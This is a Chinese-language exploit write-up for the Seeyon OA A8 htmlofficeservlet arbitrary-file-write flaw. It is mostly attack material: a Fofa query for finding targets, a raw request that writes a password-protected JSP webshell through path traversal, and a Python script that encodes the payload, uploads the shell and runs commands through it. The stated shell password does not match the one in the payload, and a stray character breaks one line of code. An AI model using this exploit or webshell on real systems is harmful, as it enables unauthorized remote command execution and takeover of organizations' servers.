致远 OA A8 htmlofficeservlet getshell 漏洞
==========================================

一、漏洞影响
------------

致远A8-V5协同管理软件 V6.1sp1

致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3

致远A8+协同管理软件 V7.1

二、复现过程
------------

### 指纹

    Fofa：app="用友-致远OA"

![0d4b978ed1474946.png](./resource/致远OAA8htmlofficeservletgetshell漏洞/media/rId25.png)

    DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
    OPTION=S3WYOSWLBSGr
    currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
    CREATEDATE=wUghPB3szB3Xwg66
    RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
    originalFileId=wV66
    originalCreateDate=wUghPB3szB3Xwg66
    FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
    needReadFile=yRWZdAS6
    originalCreateDate=wLSGP4oEzLKAz4=iz=66
    <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd33445".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce

webshell地址为**/seeyon/test123456.jsp**，密码为：asasd3344。

### poc

    from sys import argv
    
    letters = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
    
    def base64_encode(input_str):
        str_ascii_list = ['{:0>8}'.format(str(bin(ord(i))).replace('0b', ''))
                          for i in input_str]
        output_str = ''
        equal_num = 0
        while str_ascii_list:
            temp_list = str_ascii_list[:3]
            if len(temp_list) != 3:
                while len(temp_list) < 3:
                    equal_num += 1
                    temp_list += ['0' * 8]
            temp_str = ''.join(temp_list)
            temp_str_list = [temp_str[x:x + 6] for x in [0, 6, 12, 18]]
            temp_str_list = [int(x, 2) for x in temp_str_list]
            if equal_num:
                temp_str_list = temp_str_list[0:4 - equal_num]
            output_str += ''.join([letters[x] for x in temp_str_list])
            str_ascii_list = str_ascii_list[3:]
        output_str = output_str + '=' * equal_num
        return output_str
    
    def base64_decode(input_str):
        str_ascii_list = ['{:0>6}'.format(str(bin(letters.index(i))).replace('0b', ''))
                          for i in input_str if i != '=']
        output_str = ''
        equal_num = input_str.count('=')
        while str_ascii_list:
            temp_list = str_ascii_list[:4]
            temp_str = ''.join(temp_list)
            if len(temp_str) % 8 != 0:
                temp_str = temp_str[0:-1 * equal_num * 2]
            temp_str_list = [temp_str[x:x + 8] for x in [0, 8, 16]]
            temp_str_list = [int(x, 2) for x in temp_str_list if x]
            output_str += ''.join([chr(x) for x in temp_str_list])
            str_ascii_list = str_ascii_list[4:]
        return output_str
    
    if __name__ == "__main__":
        if len(argv) == 2:
            print(base64_decode(argv[1]))
        elif len(argv) == 3:
            if argv[1] == '-d':
                print(base64_decode(argv[2]))
            else:
                print(base64_encode(argv[2]))
        else:
            print("Seeyon OA /seeyon/htmlofficeservlet param encode/decode")
            print("Usage:")
            print("python %s encoded_str" % argv[0])t
            print("python %s -d encoded_str" % argv[0])
            print("python %s -e raw_str" % argv[0])

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
import random
import string
import requests

info = {
    "name": "致远 A8 可 getshell",
    "author": "reber",
    "version": "致远A8-V5协同管理软件V6.1sp1、致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3、V7.1",
    "type": "file_upload",
    "level": "high",
    "result": "",
    "status": False,
    "references": "<url>",
    "desc": "<vul describtion>",
}

def assign(service, arg):
   if service == 'seeyon':
       return True, arg

def encode(origin_bytes):
    """
    重构 base64 编码函数
    """
    # 将每一位bytes转换为二进制字符串
    base64_charset = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
    base64_bytes = ['{:0>8}'.format(bin(ord(b)).replace('0b', '')) for b in origin_bytes]

    resp = ''
    nums = len(base64_bytes) // 3
    remain = len(base64_bytes) % 3

    integral_part = base64_bytes[0:3 * nums]
    while integral_part:
        # 取三个字节，以每6比特，转换为4个整数
        tmp_unit = ''.join(integral_part[0:3])
        tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]
        # 取对应base64字符
        resp += ''.join([base64_charset[i] for i in tmp_unit])
        integral_part = integral_part[3:]

    if remain:
        # 补齐三个字节，每个字节补充 0000 0000
        remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8
        # 取三个字节，以每6比特，转换为4个整数
        # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=
        tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]
        resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='

    return resp

def verify(arg):
    url = arg + "/seeyon/htmlofficeservlet"
    tmp_random_str = ''.join(random.sample(string.letters+string.digits, 10))
    headers = {
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
        "Content-Length": "429",
    }
    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\shXi3GAEuT.txt')
    payload = "DBSTEP V3.0     355             0               10             DBSTEP=OKMLlKlV\r\n"
    payload += "OPTION=S3WYOSWLBSGr\r\n"
    payload += "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n"
    payload += "CREATEDATE=wUghPB3szB3Xwg66\r\n"
    payload += "RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n"
    payload += "originalFileId=wV66\r\n"
    payload += "originalCreateDate=wUghPB3szB3Xwg66\r\n"
    payload += "FILENAME={}\r\n".format(file_name)
    payload += "needReadFile=yRWZdAS6\r\n"
    payload += "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n"
    payload += "a{}".format(tmp_random_str)

    try:
        requests.post(url=url, data=payload, headers=headers)
        
        upfile_url = arg+"/seeyon/shXi3GAEuT.txt"
        time.sleep(2)
        resp = requests.get(url=upfile_url)
        code = resp.status_code
        content = resp.text
    except Exception as e:
        # print str(e)
        pass
    else:
        if code==200 and tmp_random_str[1:] in content:
            info['status'] = True
            info['result'] = "{} 可直接getshell, 测试文件路径: {}".format(arg,upfile_url)

def attack(arg):
    url = arg + "/seeyon/htmlofficeservlet"
    headers = {
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
        "Content-Length": "429",
    }
    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\qwer960452.jsp')
    payload = """DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
OPTION=S3WYOSWLBSGr\r
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
CREATEDATE=wUghPB3szB3Xwg66\r
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
originalFileId=wV66\r
originalCreateDate=wUghPB3szB3Xwg66\r
FILENAME="""+file_name+"""\r
needReadFile=yRWZdAS6\r
originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("el38A9485".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce"""

    requests.post(url=url, data=payload, headers=headers)
    resp = requests.get(arg+'/seeyon/qwer960452.jsp?pwd=el38A9485&cmd=cmd+/c+echo+ekwjkjrwre')
    if 'ekwjkjrwre' in resp.text:
        print "{} 的 webshell 路径: {}".format(arg,arg+'/seeyon/qwer960452.jsp?pwd=el38A9485&cmd=cmd+/c+whoami')
```



参考链接
--------

> https://github.com/nian-hua/CVEScript/blob/master/致远OA/zhiyuan.py
>
> http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/

